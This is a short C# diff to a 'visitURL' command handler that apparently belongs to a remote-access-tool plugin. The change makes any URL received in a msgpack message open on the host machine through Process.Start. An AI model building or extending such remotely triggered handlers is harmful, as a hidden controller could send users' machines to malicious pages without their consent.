@@ -26,10 +26,11 @@ namespace Plugin
                     case "visitURL":
                         {
                             string url = unpack_msgpack.ForcePathObject("URL").AsString;
-                            if (url.StartsWith("http"))
+                            if (!url.StartsWith("http"))
                             {
-                                Process.Start(url);
+                                url = "http://" + url;
                             }
+                            Process.Start(url);
                             break;
                         }
 
